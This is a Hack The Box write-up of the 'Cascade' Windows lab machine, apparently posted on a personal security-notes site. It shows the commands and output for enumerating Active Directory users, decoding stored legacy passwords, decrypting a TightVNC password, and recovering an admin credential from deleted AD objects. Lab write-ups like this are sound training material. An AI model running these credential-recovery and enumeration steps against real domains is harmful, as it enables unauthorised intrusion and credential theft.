<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6."><meta property="og:title" content="HTB - Cascade"><meta property="og:description" content="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6."><meta property="og:type" content="website"><meta property="og:image" content="https://cavonstavant.github.io/SecNotes/icon.png"><meta property="og:url" content="https://cavonstavant.github.io/SecNotes/HTB/Medium/Cascade/Cascade/"><meta property="og:width" content="200"><meta property="og:height" content="200"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Cascade"><meta name=twitter:description content="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6."><meta name=twitter:image content="https://cavonstavant.github.io/SecNotes/icon.png"><meta name=twitter:site content="Cavonstavant"><title>HTB - Cascade</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://cavonstavant.github.io/SecNotes//icon.png><link href=https://cavonstavant.github.io/SecNotes/styles.23697beb605d2a3fed62e1f7c912e378.min.css rel=stylesheet><link href=https://cavonstavant.github.io/SecNotes/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://cavonstavant.github.io/SecNotes/js/darkmode.dc8ba7f10e74c42c8f5a41d929572400.min.js></script>
<script src=https://cavonstavant.github.io/SecNotes/js/util.a0ccf91e1937fe761a74da4946452710.min.js></script>
<link rel=preload href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css as=style onload='this.onload=null,this.rel="stylesheet"' integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/@floating-ui/core@1.2.1></script>
<script src=https://cdn.jsdelivr.net/npm/@floating-ui/dom@1.2.1></script>
<script async src=https://cavonstavant.github.io/SecNotes/js/popover.aa9bc99c7c38d3ae9538f218f1416adb.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/code-title.ce4a43f09239a9efb48fee342e8ef2df.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/clipboard.2913da76d3cb21c5deaa4bae7da38c9f.min.js></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const SEARCH_ENABLED=!1,LATEX_ENABLED=!0,PRODUCTION=!0,BASE_URL="https://cavonstavant.github.io/SecNotes/",fetchData=Promise.all([fetch("https://cavonstavant.github.io/SecNotes/indices/linkIndex.ac522573b28d37ea33be7c6fcdec4721.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://cavonstavant.github.io/SecNotes/indices/contentIndex.171c915b275608bd97ffee3517438140.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://cavonstavant.github.io/SecNotes",!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!0;drawGraph("https://cavonstavant.github.io/SecNotes",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:2,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}var i=document.getElementsByClassName("mermaid");i.length>0&&import("https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs").then(e=>{e.default.init()});function a(n){const e=n.target,t=e.className.split(" "),s=t.includes("broken"),o=t.includes("internal-link");plausible("Link Click",{props:{href:e.href,broken:s,internal:o,graph:!1}})}const r=document.querySelectorAll("a");for(link of r)link.className.includes("root-title")&&link.addEventListener("click",a,{once:!0})},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'’':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/cavonstavant.github.io\/SecNotes\/js\/router.d6fe6bd821db9ea97f9aeefae814d8e7.min.js"
    attachSPARouting(init, render)
  </script><script defer data-domain=cavonstavant.github.io/SecNotes src=https://plausible.io/js/script.js></script>
<script>window.plausible=window.plausible||function(){(window.plausible.q=window.plausible.q||[]).push(arguments)}</script></head><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://cavonstavant.github.io/SecNotes/js/full-text-search.e6e2e0c213187ca0c703d6e2c7a77fcd.min.js></script><div class=singlePage><header><h1 id=page-title><a class=root-title href=https://cavonstavant.github.io/SecNotes/>SecNotes</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>HTB - Cascade</h1><p class=meta>Last updated
Mar 16, 2023</p><ul class=tags><li><a href=https://cavonstavant.github.io/SecNotes/tags/HTB/>Htb</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/Medium/>Medium</a></li><li><a href=https://cavonstavant.github.io/SecNotes/tags/Windows/>Windows</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#getting-ssmith-password>Getting <code>s.smith</code> password</a></li><li><a href=#decompiling-cascauditexe>Decompiling <code>CascAudit.exe</code></a></li><li><a href=#videos-references>Videos references</a><ol><li><a href=#ippsec>IppSec</a></li></ol></li></ol></nav></details></aside><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
</span></span><span class=line><span class=cl>| dns-nsid: 
</span></span><span class=line><span class=cl>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-16 17:02:51Z)
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>49154/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49155/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>| smb2-security-mode: 
</span></span><span class=line><span class=cl>|   210: 
</span></span><span class=line><span class=cl>|_    Message signing enabled and required
</span></span><span class=line><span class=cl>| smb2-time: 
</span></span><span class=line><span class=cl>|   date: 2023-03-16T17:03:44
</span></span><span class=line><span class=cl>|_  start_date: 2023-03-16T15:59:37
</span></span></code></pre></td></tr></table></div></div><p>Classic windows box with ldap and smb2 server.</p><p>Using <code>ldeep</code> we enumerate users on the domain</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~/HTB/Cascade
</span></span><span class=line><span class=cl>❯ ldeep ldap -a -d cascade.local -s ldap://10.10.10.182 users all                                             
</span></span><span class=line><span class=cl>[&#39;i.croft&#39;]
</span></span><span class=line><span class=cl>[&#39;j.allen&#39;]
</span></span><span class=line><span class=cl>[&#39;BackupSvc&#39;]
</span></span><span class=line><span class=cl>[&#39;d.burman&#39;]
</span></span><span class=line><span class=cl>[&#39;b.hanson&#39;]
</span></span><span class=line><span class=cl>[&#39;e.crowe&#39;]
</span></span><span class=line><span class=cl>[&#39;a.turnbull&#39;]
</span></span><span class=line><span class=cl>[&#39;j.goodhand&#39;]
</span></span><span class=line><span class=cl>[&#39;s.hickson&#39;]
</span></span><span class=line><span class=cl>[&#39;j.wakefield&#39;]
</span></span><span class=line><span class=cl>[&#39;util&#39;]
</span></span><span class=line><span class=cl>[&#39;r.thompson&#39;]
</span></span><span class=line><span class=cl>[&#39;s.smith&#39;]
</span></span><span class=line><span class=cl>[&#39;arksvc&#39;]
</span></span><span class=line><span class=cl>[&#39;CascGuest&#39;]
</span></span></code></pre></td></tr></table></div></div><p>Since Kerberos is enabled on the domain, we can try to check if the users we got in LDAP matches any users in the AD. To do that, we&rsquo;ll use <code>kerbrute</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~/HTB/Cascade
</span></span><span class=line><span class=cl>❯ /home/kali/kerbrute_linux_amd64 userenum --dc 10.10.10.182 --domain cascade.local ldap_users 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span class=line><span class=cl>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span><span class=line><span class=cl> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span class=line><span class=cl>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Version: v1.0.3 (9dad6e1) - 03/16/23 - Ronnie Flathers @ropnop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023/03/16 13:19:56 &gt;  Using KDC(s):
</span></span><span class=line><span class=cl>2023/03/16 13:19:56 &gt;  	10.10.10.182:88
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 d.burman@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 j.wakefield@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 BackupSvc@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 a.turnbull@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 j.goodhand@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 s.hickson@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:01 &gt;  [+] VALID USERNAME:	 j.allen@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:06 &gt;  [+] VALID USERNAME:	 util@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:06 &gt;  [+] VALID USERNAME:	 arksvc@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:06 &gt;  [+] VALID USERNAME:	 s.smith@cascade.local
</span></span><span class=line><span class=cl>2023/03/16 13:20:06 &gt;  [+] VALID USERNAME:	 r.thompson@cascade.local
</span></span></code></pre></td></tr></table></div></div><p>Looking for more infos in the user inside LDAP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~/HTB/Cascade
</span></span><span class=line><span class=cl>❯ ldapsearch -x -H ldap://10.10.10.182 -b &#39;DC=cascade,DC=local&#39; -s sub &#39;(objectclass=user)&#39;
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl># Ryan Thompson, Users, UK, cascade.local
</span></span><span class=line><span class=cl>dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>sAMAccountName: r.thompson
</span></span><span class=line><span class=cl>sAMAccountType: 805306368
</span></span><span class=line><span class=cl>userPrincipalName: r.thompson@cascade.local
</span></span><span class=line><span class=cl>objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>cascadeLegacyPwd: clk0bjVldmE=
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>An additional attribute was added to the Ryan Thompson user data inside the LDAP server, upon decoding the <code>cascadeLegacyPwd</code> we find the password of r.thompson. We can confirm that by trying to use it wit crackmapexec</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>~/HTB/Cascade
</span></span><span class=line><span class=cl>❯ cme smb cascade.local -u r.thompson -p &#39;rY4n5eva&#39; --shares
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         [+] Enumerated shares
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         Audit$                          
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         C$                              Default share
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         Data            READ            
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         IPC$                            Remote IPC
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         print$          READ            Printer Drivers
</span></span><span class=line><span class=cl>SMB         cascade.local   445    CASC-DC1         SYSVOL          READ            Logon server share
</span></span></code></pre></td></tr></table></div></div><p>We&rsquo;ll leave aside the <code>Audit$</code> share and focus on the <code>Data</code> one first.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Email Archives
</span></span><span class=line><span class=cl>│   └── Meeting_Notes_June_2018.html
</span></span><span class=line><span class=cl>├── LogonAudit
</span></span><span class=line><span class=cl>├── Logs
</span></span><span class=line><span class=cl>│   ├── Ark AD Recycle Bin
</span></span><span class=line><span class=cl>│   │   └── ArkAdRecycleBin.log
</span></span><span class=line><span class=cl>│   └── DCs
</span></span><span class=line><span class=cl>│       └── dcdiag.log
</span></span><span class=line><span class=cl>└── Temp
</span></span><span class=line><span class=cl>    ├── r.thompson
</span></span><span class=line><span class=cl>    └── s.smith
</span></span><span class=line><span class=cl>        └── VNC Install.reg
</span></span></code></pre></td></tr></table></div></div><p>There is multiple information&rsquo;s that we can deduce from this data :)</p><ol><li>We have an encrypted version of the <code>s.smith</code> password</li><li>Inside the <code>Meeting_Notes_June_2018.html</code> file we discover that there is a temp admin that have the same credential as the real admin</li><li>The <code>ArkAdRecycleBin.log</code> tells us that the TempAdmin was deleted and put in the AD Recycle Bin</li></ol><a href=#getting-ssmith-password><h2 id=getting-ssmith-password><span class=hanchor arialabel=Anchor># </span>Getting <code>s.smith</code> password</h2></a><p>Inside the <code>Temp/s.smith</code> directory we discover a registry file that looks like a <code>TightVNC</code> server configuration. Inside we find a key named password in an hexadecimal format</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;UseMirrorDriver&#34;=dword:00000001
</span></span><span class=line><span class=cl>&#34;EnableUrlParams&#34;=dword:00000001
</span></span><span class=line><span class=cl>&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
</span></span><span class=line><span class=cl>&#34;AlwaysShared&#34;=dword:00000000
</span></span><span class=line><span class=cl>&#34;NeverShared&#34;=dword:00000000
</span></span></code></pre></td></tr></table></div></div><p>Using this following
<a href=https://github.com/billchaison/VNCDecrypt rel=noopener>resource</a> we can successfully decode the password</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>❯ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              14:53:39
</span></span><span class=line><span class=cl>00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
</span></span><span class=line><span class=cl>00000008
</span></span></code></pre></td></tr></table></div></div><p>This give us <code>s.smith</code> with which we can logon to the machine using evil-winrm and access the user flag.</p><p><code>s.smith</code> have access to the <code>Audit$</code> share which contains some windows binaries as well as an <code>Audit.db</code>.</p><p>Using <code>smbclient</code>, we can retrieve all the files located inside the share</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>❯ smbclient \\\\10.10.10.182\\Audit\$ -Tc audit_allfiles.tar / -U CASCADE.LOCAL/s.smith
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>❯ tree
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── audit_allfiles.tar
</span></span><span class=line><span class=cl>├── CascAudit.exe
</span></span><span class=line><span class=cl>├── CascCrypto.dll
</span></span><span class=line><span class=cl>├── DB
</span></span><span class=line><span class=cl>│   └── Audit.db
</span></span><span class=line><span class=cl>├── RunAudit.bat
</span></span><span class=line><span class=cl>├── x64
</span></span><span class=line><span class=cl>│   └── SQLite.Interop.dll
</span></span><span class=line><span class=cl>└── x86
</span></span><span class=line><span class=cl>    └── SQLite.Interop.dll
</span></span></code></pre></td></tr></table></div></div><p>Inside the Audit db we find a base64 encoded password that belongs to <code>ArkSvc</code>.</p><p><code>ArkSvc</code> belongs to the <code>AD Recycle Bin</code> group, this mean that if we are able to become this user we&rsquo;ll be able to retrieve the password of <code>TempAdmin</code> which would be the <code>Administrator</code> password</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; net user arksvc
</span></span><span class=line><span class=cl>User name                    arksvc
</span></span><span class=line><span class=cl>Full Name                    ArkSvc
</span></span><span class=line><span class=cl>Comment
</span></span><span class=line><span class=cl>User&#39;s comment
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Local Group Memberships      *AD Recycle Bin       *IT       *Remote Management Use
</span></span><span class=line><span class=cl>Global Group memberships     *Domain Users
</span></span></code></pre></td></tr></table></div></div><a href=#decompiling-cascauditexe><h2 id=decompiling-cascauditexe><span class=hanchor arialabel=Anchor># </span>Decompiling <code>CascAudit.exe</code></h2></a><p>Using ILSpy and Avalonia we can decompile the executable and find that the base64 password that we found is actually AES encrypted and that the IV and the Key to encrypt the password are in plain text.</p><p>We can use them to decrypt <code>ArkSvc</code>s password and login as <code>ArkSvc</code> with evil-winrm
<img src=https://cavonstavant.github.io/SecNotes//Pasted%20image%2020230316233054.png width=auto alt></p><p>Judging from the
<a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#ad-recycle-bin rel=noopener>Hacktricks section</a> about the <code>AD Recycle Bin</code> group we can list all AD object that were deleted, thus allowing us to retrieve the <code>TempAdmin</code> object</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter &#39;isDeleted -eq $true -and sAMAccountName -eq &#34;TempAdmin&#34;&#39; -includeDeletedObjects -Properties *
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
</span></span><span class=line><span class=cl>CN                              : TempAdmin
</span></span><span class=line><span class=cl>...
